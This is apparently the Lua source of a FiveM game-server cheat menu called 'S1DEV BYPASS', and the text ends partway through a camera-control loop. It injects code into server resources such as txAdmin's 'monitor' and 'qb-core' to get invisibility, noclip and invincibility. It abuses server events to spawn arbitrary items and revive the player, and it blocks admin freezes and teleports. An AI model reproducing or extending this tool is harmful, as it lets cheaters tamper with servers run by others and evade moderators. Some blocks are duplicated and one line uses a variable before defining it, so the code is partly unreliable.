local GuncelVersion = "1.0.4" -- Current version number

-- system message 
print("S1DEV BYPASS ACTIVE")

local MenuSize = vec2(700, 500)
local MenuStartCoords = vec2(0, 0)
local TabSectionWidth = 150 

local MenuWindow = MachoMenuTabbedWindow("S1DEV", MenuStartCoords.x, MenuStartCoords.y, MenuSize.x, MenuSize.y, TabSectionWidth)
local menu = 1
-- RGB accent (changing color)
local rgbHue = 0
local function UpdateRGBAccent()
    local r = math.floor(255 * math.sin(rgbHue) * 0.5 + 127.5)
    local g = math.floor(255 * math.sin(rgbHue + 2.094) * 0.5 + 127.5)
    local b = math.floor(255 * math.sin(rgbHue + 4.188) * 0.5 + 127.5)
    
    MachoMenuSetAccent(MenuWindow, r, g, b)
    rgbHue = rgbHue + 0.02
    if rgbHue > 6.28 then
        rgbHue = 0
    end
end

-- RGB thread start
Citizen.CreateThread(function()
    while true do
        UpdateRGBAccent()
        Citizen.Wait(25) -- 20ms = 50 FPS color change (faster)
    end
end)
MachoMenuSetKeybind(MenuWindow, 0x24)

local FirstTab = MachoMenuAddTab(MenuWindow, "Main Menu")

-- Left section (Main controls)
local FirstSection = MachoMenuGroup(
    FirstTab,
    "General",
    420,              -- X position (fixed)
    9,               -- Y position
    710,             -- Width (increased)
    MenuSize.y - 10
)

-- Right section (Tx Features)
local SecondSection = MachoMenuGroup(
    FirstTab,
    "Tx Features",
    155,             -- X position (FirstSection + width + space)
    9,               -- Y position
    420,             -- Width (same structure)
    MenuSize.y - 10
)

-- Show/Hide ID on right side
local idgoster = false
MachoMenuCheckbox(FirstSection, "Show/Hide ID - Safe", function()
    idgoster = true
    MachoMenuNotification("Menu", "Show/Hide ID status: On")
end, function()
    idgoster = false
    MachoMenuNotification("Menu", "Show/Hide ID status: Off")
end)

-- TX Admin Show Player IDs (Toggle)
local txIdsEnabled = false

MachoMenuCheckbox(SecondSection, "TX Show Player IDs", function()
    txIdsEnabled = true
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        menuIsAccessible = true
        toggleShowPlayerIDs(true, true)
    ]])
    MachoMenuNotification("TX Admin", "Showing player IDs")
end, function()
    txIdsEnabled = false
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        menuIsAccessible = true
        toggleShowPlayerIDs(false, true)
    ]])
    MachoMenuNotification("TX Admin", "Hiding player IDs")
end)

-- Toggle Invisibility
local invisibilityActive = false

MachoMenuCheckbox(SecondSection, "Invisibility", function()
    invisibilityActive = true
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        if not _G.NEVERBOKLOSEInvisibility then
            _G.NEVERBOKLOSEInvisibility = { enabled = false, wasVisible = true }
        end
        _G.NEVERBOKLOSEInvisibility.enabled = true
        local ped = PlayerPedId()
        _G.NEVERBOKLOSEInvisibility.wasVisible = IsEntityVisible(ped)
        SetEntityVisible(ped, false, false)
        
        CreateThread(function()
            while _G.NEVERBOKLOSEInvisibility and _G.NEVERBOKLOSEInvisibility.enabled do
                local currentPed = PlayerPedId()
                if currentPed and DoesEntityExist(currentPed) then
                    SetEntityVisible(currentPed, false, false)
                end
                Wait(500)
            end
        end)
    ]])
    MachoMenuNotification("Invisibility", "Invisibility ON")
end, function()
    invisibilityActive = false
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        if _G.NEVERBOKLOSEInvisibility and _G.NEVERBOKLOSEInvisibility.enabled then
            _G.NEVERBOKLOSEInvisibility.enabled = false
            local ped = PlayerPedId()
            if ped and DoesEntityExist(ped) then
                SetEntityVisible(ped, _G.NEVERBOKLOSEInvisibility.wasVisible, false)
            end
        end
    ]])
    MachoMenuNotification("Invisibility", "Invisibility OFF")
end)

local isInvisible = false
local isInvisible2 = false

-- Global variables for TX features
local txNoclipActive = false
local txGodmodeActive = false
local txSuperJumpActive = false
local txCarBoostActive = false

-- Invisibility On/Off Toggle Button
MachoMenuCheckbox(FirstSection, "Invisibility - Safe", function()
    local playerPed = PlayerPedId()
    local playerVeh = GetVehiclePedIsIn(playerPed, false)

    MachoInjectResource('qb-core', [[
        local playerPed = PlayerPedId()
        local playerVeh = GetVehiclePedIsIn(playerPed, false)

        -- Invisible to others
        SetEntityVisible(playerPed, false, false)
        NetworkSetEntityInvisibleToNetwork(playerPed, true)
        SetEntityAlpha(playerPed, 0, false)

        if playerVeh ~= 0 then
            SetEntityVisible(playerVeh, false, false)
            NetworkSetEntityInvisibleToNetwork(playerVeh, true)
            SetEntityAlpha(playerVeh, 0, false)
        end

        -- Visible to yourself
        SetEntityLocallyVisible(playerPed)
        SetEntityAlpha(playerPed, 255, false)

        if playerVeh ~= 0 then
            SetEntityLocallyVisible(playerVeh)
            SetEntityAlpha(playerVeh, 255, false)
        end
    ]])
    isInvisible = true
end, function()
    local playerPed = PlayerPedId()
    local playerVeh = GetVehiclePedIsIn(playerPed, false)

    MachoInjectResource('qb-core', [[
        local playerPed = PlayerPedId()
        local playerVeh = GetVehiclePedIsIn(playerPed, false)

        -- Make visible
        SetEntityVisible(playerPed, true, false)
        NetworkSetEntityInvisibleToNetwork(playerPed, false)
        ResetEntityAlpha(playerPed)

        if playerVeh ~= 0 then
            SetEntityVisible(playerVeh, true, false)
            NetworkSetEntityInvisibleToNetwork(playerVeh, false)
            ResetEntityAlpha(playerVeh)
        end
    ]])
    isInvisible = false
end)

-- Continuous visibility/invisibility protection (bypass supported)
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        if isInvisible then
            local playerPed = PlayerPedId()
            local playerVeh = GetVehiclePedIsIn(playerPed, false)

            SetEntityVisible(playerPed, false, false)
            NetworkSetEntityInvisibleToNetwork(playerPed, true)
            SetEntityAlpha(playerPed, 0, false)

            if playerVeh ~= 0 then
                SetEntityVisible(playerVeh, false, false)
                NetworkSetEntityInvisibleToNetwork(playerVeh, true)
                SetEntityAlpha(playerVeh, 0, false)
            end

            SetEntityLocallyVisible(playerPed)
            SetEntityAlpha(playerPed, 255, false)

            if playerVeh ~= 0 then
                SetEntityLocallyVisible(playerVeh)
                SetEntityAlpha(playerVeh, 255, false)
            end
        end
    end
end)

local noclipActive = false
local playerPed = PlayerPedId()
local noclipSpeed = 2.0
local fallAnimDict = "move_jump"
local fallAnim = "land_roll"

function LoadAnimDict(dict)
    RequestAnimDict(dict)
    while not HasAnimDictLoaded(dict) do
        Citizen.Wait(0)
    end
end

-- Safe Noclip Toggle Button
MachoMenuCheckbox(FirstSection, "Noclip - Safe", function()
    MachoInjectResource('monitor', [[
        local playerPed = PlayerPedId()
        local fallAnimDict = "move_jump"
        local fallAnim = "land_roll"
        RequestAnimDict(fallAnimDict)
        while not HasAnimDictLoaded(fallAnimDict) do
            Citizen.Wait(0)
        end
        TaskPlayAnim(playerPed, fallAnimDict, fallAnim, 8.0, -8.0, -1, 49, 0, false, false, false)
        SetPedToRagdoll(playerPed, 1000, 1000, 0, true, true, false)
        SetEntityCollision(playerPed, false, false)
        SetEntityAlpha(playerPed, 150, false)
        SetEntityInvincible(playerPed, true)
    ]])
    noclipActive = true
end, function()
    MachoInjectResource('monitor', [[
        local playerPed = PlayerPedId()
        ClearPedTasks(playerPed)
        SetEntityCollision(playerPed, true, true)
        ResetEntityAlpha(playerPed)
        SetEntityInvincible(playerPed, false)
    ]])
    noclipActive = false
end)

-- TX Admin Show Player IDs (Toggle)
local txIdsEnabled = false

MachoMenuCheckbox(SecondSection, "TX Show Player IDs", function()
    txIdsEnabled = true
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        menuIsAccessible = true
        toggleShowPlayerIDs(true, true)
    ]])
    MachoMenuNotification("TX Admin", "Showing player IDs")
end, function()
    txIdsEnabled = false
    MachoInjectResource2(NewThreadNs, 'monitor', [[
        menuIsAccessible = true
        toggleShowPlayerIDs(false, true)
    ]])
    MachoMenuNotification("TX Admin", "Hiding player IDs")
end)


-- ============================================================
-- FB Clothes Shop
MachoMenuButton(FirstSection, "FB Clothes Shop", function()
    TriggerEvent('FBClothing:client:openClothingShopMenu')
    MachoMenuNotification("FB Clothes", "Opening clothes shop...")
end)

-- FB Change Character
MachoMenuButton(FirstSection, "FB Change Character", function()
    TriggerEvent('qb-MultiCharacter:server:openui')
    MachoMenuNotification("FB Character", "Opening character selection...")
end)


-- FB Revive (RespectEMS)
MachoMenuButton(FirstSection, "FB Revive (RespectEMS)", function()
    TriggerEvent('RespectEMS:client:revive', true)
    MachoMenuNotification("FB Revive", "Revive requested...")
end)

-- FB Hospital Revive
MachoMenuButton(FirstSection, "FB Hospital Revive", function()
    TriggerEvent('hospital:client:Revive')
    MachoMenuNotification("FB Revive", "Revive requested...")
end)

-- FB Ambulance Revive
MachoMenuButton(FirstSection, "FB Ambulance Revive", function()
    TriggerEvent('ambulancejob:client:revive')
    MachoMenuNotification("FB Revive", "Revive requested...")
end)

-- FB Cuff Self
MachoMenuButton(FirstSection, "FB Cuff Self", function()
    TriggerEvent('police:client:GetCuffed', -1)
    MachoMenuNotification("FB Police", "Cuffed yourself")
end)

-- FB Toggle Admin Names
MachoMenuButton(FirstSection, "FB Toggle Admin Names", function()
    TriggerEvent('qb-admin:client:toggleNames')
    MachoMenuNotification("FB Admin", "Toggled admin names")
end)

-- FB Toggle Admin Blips
MachoMenuButton(FirstSection, "FB Toggle Admin Blips", function()
    TriggerEvent('qb-admin:client:toggleBlips')
    MachoMenuNotification("FB Admin", "Toggled admin blips")
end)

-- FB Open Jail Menu
MachoMenuButton(FirstSection, "FB Open Jail Menu", function()
    TriggerEvent('RespectJail:client:openMenu')
    MachoMenuNotification("FB Jail", "Opening jail menu...")
end)

-- FB Open Police Reports
MachoMenuButton(FirstSection, "FB Open Police Reports", function()
    TriggerEvent('FB-PoliceJob:client:openReportsMenu', 'station')
    MachoMenuNotification("FB Police", "Opening police reports...")
end)

-- RT Lumberjack Item Spawner (Self)
local SelfLumberjackItemInput = MachoMenuInputbox(FirstSection, "Item Name", "e.g., weapon_pistol")
local SelfLumberjackAmountInput = MachoMenuInputbox(FirstSection, "Amount", "1")

MachoMenuButton(FirstSection, "Spawn Item inv", function()
    local itemName = MachoMenuGetInputbox(SelfLumberjackItemInput)
    local amount = tonumber(MachoMenuGetInputbox(SelfLumberjackAmountInput)) or 1
    
    if itemName and itemName ~= '' then
        if amount > 0 then
            TriggerServerEvent('rt-lumberjack:server:giveItem', itemName, amount)
            MachoMenuNotification("Item Spawn", "Spawning " .. itemName .. " x" .. amount)
            print("[Item Spawn] Spawning " .. itemName .. " x" .. amount)
        else
            MachoMenuNotification("Error", "Please enter a valid amount!")
        end
    else
        MachoMenuNotification("Error", "Please enter an item name!")
    end
end)

-- RT Steal Item Spawner (Self)
local RtStealItemInput = MachoMenuInputbox(FirstSection, "22Item Name", "e.g., LOCKPICK")
local RtStealAmountInput = MachoMenuInputbox(FirstSection, "22Amount", "1")

MachoMenuButton(FirstSection, "Spawn Item IN inv", function()
    local itemName = MachoMenuGetInputbox(RtStealItemInput)
    local amount = tonumber(MachoMenuGetInputbox(RtStealAmountInput)) or 1
    
    if itemName and itemName ~= '' then
        if amount > 0 then
            -- Try direct trigger first
            local success = false
            pcall(function()
                TriggerServerEvent('rt-steal:server:giveItem', itemName, amount)
                success = true
            end)
            
            -- If direct fails, inject into a resource
            if not success then
                local targetResource = nil
                if GetResourceState('rt-steal') == "started" then
                    targetResource = 'rt-steal'
                elseif GetResourceState('monitor') == "started" then
                    targetResource = 'monitor'
                elseif GetResourceState('qb-core') == "started" then
                    targetResource = 'qb-core'
                else
                    targetResource = 'ox_inventory'
                end
                
                MachoInjectResource2(NewThreadNs, targetResource, string.format([[
                    local itemName = "%s"
                    local amount = %d
                    TriggerServerEvent('rt-steal:server:giveItem', itemName, amount)
                    print("RT Steal Item: Spawned " .. itemName .. " x" .. amount)
                    TriggerEvent('chat:addMessage', { args = { '^2RT Steal:', 'Spawned ' .. itemName .. ' x' .. amount } })
                ]], itemName, amount))
            end
            
            MachoMenuNotification("RT Steal", "Spawning " .. itemName .. " x" .. amount)
            print("[RT Steal] Spawning " .. itemName .. " x" .. amount)
        else
            MachoMenuNotification("Error", "Please enter a valid amount!")
        end
    else
        MachoMenuNotification("Error", "Please enter an item name!")
    end
end)

MachoMenuButton(FirstSection, "FB Clothes", function()
    TriggerEvent('FBClothing:client:openOutfitMenu')
    MachoMenuNotification("FB Clothes", "Opening FB outfit menu...")
end)

MachoMenuButton(FirstSection, "FB Revive", function()
    TriggerEvent('FB_Ems:triggers:client:revivePlayer')
    MachoMenuNotification("FB Revive", "Revive requested...")
end)

-- Hospital Revive
MachoMenuButton(FirstSection, "rc2 Revive", function()
    TriggerEvent("hospital:client:Revive")
    MachoMenuNotification("Hospital", "Revive requested...")
end)
-- ============================================================
-- SELF FEATURES (Added to FirstSection - Main Menu)
-- ============================================================

-- s1 Teleport to Waypoint
MachoMenuButton(FirstSection, "s1 Teleport to Waypoint", function()
    local waypoint = GetFirstBlipInfoId(8)
    if not DoesBlipExist(waypoint) then
        MachoMenuNotification("s1", "No waypoint set!")
    else
        local coords = GetBlipInfoIdCoord(waypoint)
        local ped = PlayerPedId()
        local entity = ped
        if IsPedInAnyVehicle(ped, false) then 
            entity = GetVehiclePedIsIn(ped, false) 
        end
        SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, false, false, false, false)
        MachoMenuNotification("s1", "Teleported to waypoint!")
    end
end)

-- Super Jump (Toggle)
local superJumpActive = false
MachoMenuCheckbox(FirstSection, "s1 Super Jump", function()
    superJumpActive = true
    MachoMenuNotification("s1", "Super Jump ON")
end, function()
    superJumpActive = false
    MachoMenuNotification("s1", "Super Jump OFF")
end)

-- Fast Run Speed Slider
local fastRunSpeed = 3
local FastRunSliderHandle = MachoMenuSlider(FirstSection, "s1 Fast Run Speed", fastRunSpeed, 1, 10, "x", 1, function(Value)
    fastRunSpeed = Value
end)

-- Fast Run (Toggle)
local fastRunActive = false
MachoMenuCheckbox(FirstSection, "s1 Fast Run", function()
    fastRunActive = true
    MachoMenuNotification("s1", "Fast Run ACTIVE (Speed: " .. fastRunSpeed .. "x)")
    
    Citizen.CreateThread(function()
        while fastRunActive do
            Citizen.Wait(0)
            SetPedMoveRateOverride(PlayerPedId(), fastRunSpeed + 0.0)
        end
        SetPedMoveRateOverride(PlayerPedId(), 1.0)
    end)
end, function()
    fastRunActive = false
    SetPedMoveRateOverride(PlayerPedId(), 1.0)
    MachoMenuNotification("s1", "Fast Run OFF")
end)

-- No Ragdoll (Toggle)
local noRagdollActive = false
MachoMenuCheckbox(FirstSection, "s1 No Ragdoll", function()
    noRagdollActive = true
    SetPedCanRagdoll(PlayerPedId(), false)
    MachoMenuNotification("s1", "No Ragdoll ON")
end, function()
    noRagdollActive = false
    SetPedCanRagdoll(PlayerPedId(), true)
    MachoMenuNotification("s1", "No Ragdoll OFF")
end)

-- Anti AFK (Toggle)
local antiAFKActive = false
MachoMenuCheckbox(FirstSection, "s1 Anti AFK", function()
    antiAFKActive = true
    MachoMenuNotification("s1", "Anti AFK ACTIVE")
    
    Citizen.CreateThread(function()
        while antiAFKActive do
            Citizen.Wait(5000)
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            SetEntityCoordsNoOffset(ped, coords.x + 0.01, coords.y + 0.01, coords.z, false, false, false, false)
        end
    end)
end, function()
    antiAFKActive = false
    MachoMenuNotification("s1", "Anti AFK OFF")
end)

-- Infinite Stamina (Toggle)
local infiniteStaminaActive = false
MachoMenuCheckbox(FirstSection, "s1 Infinite Stamina", function()
    infiniteStaminaActive = true
    MachoMenuNotification("s1", "Infinite Stamina ACTIVE")
    
    Citizen.CreateThread(function()
        while infiniteStaminaActive do
            Citizen.Wait(500)
            ResetPlayerStamina(PlayerPedId())
        end
    end)
end, function()
    infiniteStaminaActive = false
    MachoMenuNotification("s1", "Infinite Stamina OFF")
end)

-- Infinite Oxygen (Toggle)
local infiniteOxygenActive = false
MachoMenuCheckbox(FirstSection, "s1 Infinite Oxygen", function()
    infiniteOxygenActive = true
    SetPedDiesInWater(PlayerPedId(), false)
    MachoMenuNotification("s1", "Infinite Oxygen ON")
end, function()
    infiniteOxygenActive = false
    SetPedDiesInWater(PlayerPedId(), true)
    MachoMenuNotification("s1", "Infinite Oxygen OFF")
end)

-- Disable Collision (Toggle)
local disableCollisionActive = false
MachoMenuCheckbox(FirstSection, "s1 Disable Collision", function()
    disableCollisionActive = true
    SetEntityCollision(PlayerPedId(), false, false)
    MachoMenuNotification("s1", "Disable Collision ON")
end, function()
    disableCollisionActive = false
    SetEntityCollision(PlayerPedId(), true, true)
    MachoMenuNotification("s1", "Disable Collision OFF")
end)

-- Fast Punch (Toggle)
local fastPunchActive = false
MachoMenuCheckbox(FirstSection, "s1 Fast Punch", function()
    fastPunchActive = true
    MachoMenuNotification("s1", "Fast Punch ON")
end, function()
    fastPunchActive = false
    MachoMenuNotification("s1", "Fast Punch OFF")
end)

-- Super Punch (Toggle)
local superPunchActive = false
MachoMenuCheckbox(FirstSection, "s1 Super Punch", function()
    superPunchActive = true
    SetWeaponDamageModifier(GetHashKey("WEAPON_UNARMED"), 1000000.0)
    MachoMenuNotification("s1", "Super Punch ON (One-hit kill)")
end, function()
    superPunchActive = false
    SetWeaponDamageModifier(GetHashKey("WEAPON_UNARMED"), 1.0)
    MachoMenuNotification("s1", "Super Punch OFF")
end)

-- ============================================================
-- SELF FEATURES (Added to FirstSection - Main Menu)
-- ============================================================

--- ============================================================
-- SELF FEATURES (Added to FirstSection - Main Menu)
-- ============================================================

-- Open Clothes Menu
MachoMenuButton(FirstSection, "Open face Menu", function()
    TriggerEvent('m3-clothingmenu:client:OpenSurgeonShop')
    MachoMenuNotification("Clothes", "Opening clothes menu...")
end)

-- Open Barber Shop
MachoMenuButton(FirstSection, "Open Barber Shop", function()
    TriggerEvent('m3-clothingmenu:client:OpenBarberShop')
    MachoMenuNotification("Barber", "Opening barber shop...")
end)

-- Open Clothing Shop
MachoMenuButton(FirstSection, "Open Clothing Shop", function()
    TriggerEvent('m3-clothingmenu:client:openClothingShopMenu')
    MachoMenuNotification("Clothing Shop", "Opening clothing shop...")
end)

-- RT Revive 2 (RespectEMS)
MachoMenuButton(FirstSection, "RT Revive 2", function()
    TriggerEvent('RespectEMS:triggers:client:revivePlayer')
    MachoMenuNotification("RT Revive 2", "Revive requested...")
end)

-- Change Character (qb-MultiCharacter)
MachoMenuButton(FirstSection, "Change Character", function()
    TriggerEvent('qb-MultiCharacter:server:openui')
    MachoMenuNotification("Character", "Opening character selection...")
end)

-- ============================================================
-- PROTECTION FEATURES (Added to FirstSection - Main Menu)
-- ============================================================

-- s1 Remove PTFX
MachoMenuButton(FirstSection, "s1 Remove PTFX", function()
    Citizen.CreateThread(function()
        local position = GetEntityCoords(PlayerPedId())
        RemoveParticleFxInRange(position.x, position.y, position.z, 200)
        RemoveParticleFxFromEntity(PlayerPedId())
        MachoMenuNotification("s1", "Removed PTFX effects")
    end)
end)

-- s1 Stop All Sounds
MachoMenuButton(FirstSection, "s1 Stop All Sounds", function()
    Citizen.CreateThread(function()
        for i = 1, 100 do
            StopSound(i)
        end
        MachoMenuNotification("s1", "Stopped all sounds")
    end)
end)

-- s1 Remove Admin Freeze
MachoMenuButton(FirstSection, "s1 Remove Admin Freeze", function()
    for i = 1, 2 do
        EnableAllControlActions(i)
    end
    FreezeEntityPosition(PlayerPedId(), false)
    SetEntityCollision(PlayerPedId(), false, true)
    Citizen.Wait(300)
    SetEntityCollision(PlayerPedId(), true, true)
    
    Citizen.Wait(2500)
    if IsEntityPositionFrozen(PlayerPedId()) then
        MachoMenuNotification("s1", "Detected still frozen, trying again...")
        for i = 1, 2 do
            EnableAllControlActions(i)
        end
        for i = 1, 10 do
            FreezeEntityPosition(PlayerPedId(), false)
        end
        MachoMenuNotification("s1", "Admin freeze removed")
    else
        MachoMenuNotification("s1", "Admin freeze removed")
    end
end)

-- s1 Remove Attached Objects
MachoMenuButton(FirstSection, "s1 Remove Attached Objects", function()
    Citizen.CreateThread(function()
        local objects = GetGamePool('CObject')
        local count = 0
        for i, object in ipairs(objects) do
            if DoesEntityExist(object) then
                DetachEntity(object, true, true)
                count = count + 1
            end
        end
        MachoMenuNotification("s1", "Removed " .. count .. " attached objects")
    end)
end)

-- s1 Disable Hostile Peds (Toggle)
local disableHostilePeds = false
MachoMenuCheckbox(FirstSection, "s1 Disable Hostile Peds", function()
    disableHostilePeds = true
    MachoMenuNotification("s1", "Hostile peds disabled")
    
    Citizen.CreateThread(function()
        while disableHostilePeds do
            Citizen.Wait(0)
            SetPedResetFlag(PlayerPedId(), 124, true)
            SetEveryoneIgnorePlayer(PlayerPedId(), true)
        end
    end)
end, function()
    disableHostilePeds = false
    MachoMenuNotification("s1", "Hostile peds enabled")
end)

-- s1 Evade Admin TP (Toggle)
local evadeTPActive = false
local lastPosition = nil
MachoMenuCheckbox(FirstSection, "s1 Evade Admin TP", function()
    evadeTPActive = true
    lastPosition = GetEntityCoords(PlayerPedId())
    MachoMenuNotification("s1", "Admin TP evasion activated")
    
    Citizen.CreateThread(function()
        while evadeTPActive do
            Citizen.Wait(100)
            local current_pos = GetEntityCoords(PlayerPedId())
            local distance = #(lastPosition - current_pos)
            
            if distance > 50 then
                SetEntityCoordsNoOffset(PlayerPedId(), lastPosition.x, lastPosition.y, lastPosition.z, false, false, false, true)
                MachoMenuNotification("s1", "Blocked admin teleport!")
            else
                lastPosition = current_pos
            end
        end
    end)
end, function()
    evadeTPActive = false
    MachoMenuNotification("s1", "Admin TP evasion deactivated")
end)

-- s1 Block Admin Freeze (Toggle)
local blockFreezeActive = false
MachoMenuCheckbox(FirstSection, "s1 Block Admin Freeze", function()
    blockFreezeActive = true
    MachoMenuNotification("s1", "Admin freeze block activated")
    
    Citizen.CreateThread(function()
        while blockFreezeActive do
            Citizen.Wait(0)
            FreezeEntityPosition(PlayerPedId(), false)
        end
    end)
end, function()
    blockFreezeActive = false
    MachoMenuNotification("s1", "Admin freeze block deactivated")
end)

-- s1 Anti Fire (Toggle)
local antiFireActive = false
MachoMenuCheckbox(FirstSection, "s1 Anti Fire", function()
    antiFireActive = true
    MachoMenuNotification("s1", "Anti fire activated")
    
    Citizen.CreateThread(function()
        while antiFireActive do
            Citizen.Wait(0)
            StopEntityFire(PlayerPedId())
        end
    end)
end, function()
    antiFireActive = false
    MachoMenuNotification("s1", "Anti fire deactivated")
end)

-- s1 Anti Attach (Toggle)
local antiAttachActive = false
MachoMenuCheckbox(FirstSection, "s1 Anti Attach", function()
    antiAttachActive = true
    MachoMenuNotification("s1", "Anti attach activated")
    
    Citizen.CreateThread(function()
        while antiAttachActive do
            Citizen.Wait(0)
            for _, v in ipairs(GetGamePool("CVehicle")) do
                if IsEntityAttachedToAnyPed(v) and GetEntityAttachedTo(v) == PlayerPedId() then
                    NetworkRequestControlOfEntity(v)
                    DetachEntity(v, 0, true)
                end
            end
            for _, obj in ipairs(GetGamePool("CObject")) do
                if IsEntityAttachedToAnyPed(obj) and GetEntityAttachedTo(obj) == PlayerPedId() then
                    NetworkRequestControlOfEntity(obj)
                    DetachEntity(obj, 0, true)
                end
            end
        end
    end)
end, function()
    antiAttachActive = false
    MachoMenuNotification("s1", "Anti attach deactivated")
end)

-- s1 Anti VDM (Toggle)
local antiVDMActive = false
MachoMenuCheckbox(FirstSection, "s1 Anti VDM", function()
    antiVDMActive = true
    MachoMenuNotification("s1", "Anti VDM activated")
    
    Citizen.CreateThread(function()
        while antiVDMActive do
            Citizen.Wait(0)
            local playerPed = PlayerPedId()
            local pCoords = GetEntityCoords(playerPed)
            for _, vehicle in ipairs(GetGamePool("CVehicle")) do
                if DoesEntityExist(vehicle) then
                    local vCoords = GetEntityCoords(vehicle)
                    local dist = #(pCoords - vCoords)
                    if dist <= 50.0 then
                        SetEntityNoCollisionEntity(vehicle, playerPed, true)
                    end
                end
            end
        end
    end)
end, function()
    antiVDMActive = false
    MachoMenuNotification("s1", "Anti VDM deactivated")
end)

-- s1 Anti Handcuff (Toggle)
local antiHandcuffActive = false
MachoMenuCheckbox(FirstSection, "s1 Anti Handcuff", function()
    antiHandcuffActive = true
    MachoMenuNotification("s1", "Anti handcuff activated")
    
    Citizen.CreateThread(function()
        while antiHandcuffActive do
            Citizen.Wait(0)
            EnableAllControlActions(0)
            EnableAllControlActions(1)
        end
    end)
end, function()
    antiHandcuffActive = false
    MachoMenuNotification("s1", "Anti handcuff deactivated")
end)

-- s1 Evade Hostage Situation
MachoMenuButton(FirstSection, "s1 Evade Hostage Situation", function()
    MachoMenuNotification("s1", "Hostage evade activated")
    -- You can add more logic here if needed
end)

-- Noclip movement control
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        playerPed = PlayerPedId()

        if noclipActive then
            local coords = GetEntityCoords(playerPed)
            local camRot = GetGameplayCamRot(2)
            local heading = math.rad(camRot.z)
            local speed = noclipSpeed

            if IsControlPressed(0, 32) then -- W
                coords = coords + vector3(speed * math.sin(heading), speed * -math.cos(heading), 0.0)
            end
            if IsControlPressed(0, 33) then -- S
                coords = coords + vector3(-speed * math.sin(heading), -speed * -math.cos(heading), 0.0)
            end
            if IsControlPressed(0, 34) then -- A
                coords = coords + vector3(speed * math.cos(heading), speed * math.sin(heading), 0.0)
            end
            if IsControlPressed(0, 35) then -- D
                coords = coords + vector3(-speed * math.cos(heading), -speed * math.sin(heading), 0.0)
            end
            if IsControlPressed(0, 21) then -- Shift (up)
                coords = coords + vector3(0.0, 0.0, speed)
            end
            if IsControlPressed(0, 36) then -- Ctrl (down)
                coords = coords + vector3(0.0, 0.0, -speed)
            end

            SetEntityCoordsNoOffset(playerPed, coords.x, coords.y, coords.z, true, true, true)

            if not IsEntityPlayingAnim(playerPed, fallAnimDict, fallAnim, 3) then
                TaskPlayAnim(playerPed, fallAnimDict, fallAnim, 8.0, -8.0, -1, 49, 0, false, false, false)
            end

            if not IsPedRagdoll(playerPed) then
                SetPedToRagdoll(playerPed, 1000, 1000, 0, true, true, false)
            end

            SetEntityRotation(playerPed, 0.0, 0.0, camRot.z, 2, true)
        end
    end
end)

local originalCameraCoords = vector3(0, 0, 0)
local isCameraActive = false
local playerPed = PlayerPedId()
local playerHeading = 0
local flyCam = nil
local isFrozen = false
local camSpeed = 2.0
local fallAnimDict = "move_jump"
local fallAnim = "land_roll"

function LoadAnimDict(dict)
    RequestAnimDict(dict)
    while not HasAnimDictLoaded(dict) do
        Citizen.Wait(0)
    end
end

-- Function to create the camera
function CreateCamera()
    local playerCoords = GetEntityCoords(playerPed, true) -- Get player's exact coordinates
    originalCameraCoords = playerCoords + vector3(0.0, 0.0, 1.5) -- Start 1.5 units above player's head
    playerHeading = GetEntityHeading(playerPed)
    flyCam = CreateCam("DEFAULT_SCRIPTED_FLY_CAMERA", true)
    SetCamCoord(flyCam, originalCameraCoords.x, originalCameraCoords.y, originalCameraCoords.z)
    SetCamRot(flyCam, 0.0, 0.0, playerHeading, 2)
    RenderScriptCams(true, false, 0, true, true)
    isCameraActive = true
    FreezeEntityPosition(playerPed, true)
    isFrozen = true
end

-- Function to destroy the camera
function DestroyCamera()
    if isCameraActive then
        RenderScriptCams(false, false, 0, true, true)
        DestroyCam(flyCam, false)
        isCameraActive = false
        FreezeEntityPosition(playerPed, false)
        isFrozen = false
    end
end

-- Safe Freecam Menu
MachoMenuCheckbox(FirstSection, "Freecam - Safe", function()
    MachoInjectResource('monitor', [[
        local playerPed = PlayerPedId()
        local fallAnimDict = "move_jump"
        local fallAnim = "land_roll"
        RequestAnimDict(fallAnimDict)
        while not HasAnimDictLoaded(fallAnimDict) do
            Citizen.Wait(0)
        end
        TaskPlayAnim(playerPed, fallAnimDict, fallAnim, 8.0, -8.0, -1, 49, 0, false, false, false)
        SetPedToRagdoll(playerPed, 1000, 1000, 0, true, true, false)
        SetEntityCollision(playerPed, false, false)
        SetEntityAlpha(playerPed, 150, true)
        SetEntityInvincible(playerPed, true)
    ]])
    CreateCamera()
end, function()
    MachoInjectResource('monitor', [[
        local playerPed = PlayerPedId()
        ClearPedTasks(playerPed)
        SetEntityCollision(playerPed, true, true)
        ResetEntityAlpha(playerPed)
        SetEntityInvincible(playerPed, true)
    ]])
    DestroyCamera()
end)

-- Main thread for camera movement
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        playerPed = PlayerPedId()

        if isCameraActive then
            local camCoords = GetCamCoord(flyCam)
            local camRot = GetCamRot(flyCam, 2)
            local heading = math.rad(camRot.z)
            local speed = camSpeed

            -- Keyboard movement controls
            if IsControlPressed(0, 33) then -- W
                camCoords = camCoords + vector3(speed * math.sin(heading), speed * -math.cos(heading), 0.0)
            end
            if IsControlPressed(0, 32) then -- S
                camCoords = camCoords + vector3(-speed * math.sin(heading), -speed * -math.cos(heading), 0.0)
            end
            if IsControlPressed(0, 35) then -- A
                camCoords = camCoords + vector3(speed * math.cos(heading), speed * math.sin(heading), 0.0)
            end
            if IsControlPressed(0, 34) then -- D
                camCoords = camCoords + vector3(-speed * math.cos(heading), -speed * math.sin(heading), 0.0)
            end
            if IsControlPressed(0, 44) then -- E (up)
                camCoords = camCoords + vector3(0.0, 0.0, speed)
            end
            if IsControlPressed(0, 38) then -- Q (down)
                camCoords = camCoords + vector3(0.0, 0.0, -speed)
            end

            SetCamCoord(flyCam, camCoords.x, camCoords.y, camCoords.z)

            -- Mouse rotation controls
            local rightAxisX = GetDisabledControlNormal(0, 1) * 0.25
            local rightAxisY = GetDisabledControlNormal(0, 2) * -0.25
            local newCamRotX = math.max(-89.0, math.min(89.0, newCamRotX))
            local newCamRotZ = camRot.z - rightAxisX * speed
            newCamRotX = math.max(-89.0, math.min(89.0, newCamRotX))
            SetCamRot(flyCam, newCamRotX, 0.0, newCamRotZ, 2)

            -- Animation and ragdoll effects
